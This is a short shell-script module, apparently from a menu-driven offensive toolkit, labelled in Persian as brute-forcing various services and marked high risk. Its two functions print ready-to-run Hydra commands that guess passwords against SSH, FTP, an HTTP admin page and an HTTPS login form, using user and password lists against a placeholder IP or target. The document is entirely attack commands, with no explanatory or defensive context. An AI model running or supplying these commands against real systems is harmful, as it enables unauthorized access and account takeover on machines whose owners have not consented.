DESC="بروت‌فورس سرویس‌های مختلف"
REQ="hydra"
RISK="HIGH"

termux(){ echo "hydra -l admin -P pass.txt ssh://<IP>"; }

kali(){
cat <<'EOF'
hydra -L users.txt -P pass.txt ssh://<IP> -t 4
hydra -L users.txt -P pass.txt ftp://<IP> -t 4
hydra -l admin -P pass.txt <IP> http-get /admin
hydra -L users.txt -P pass.txt <TARGET> https-post-form "/login:u=^USER^&p=^PASS^:F=Invalid"
# با حالت verbose:
hydra -L users.txt -P pass.txt -V ssh://<IP>
EOF
}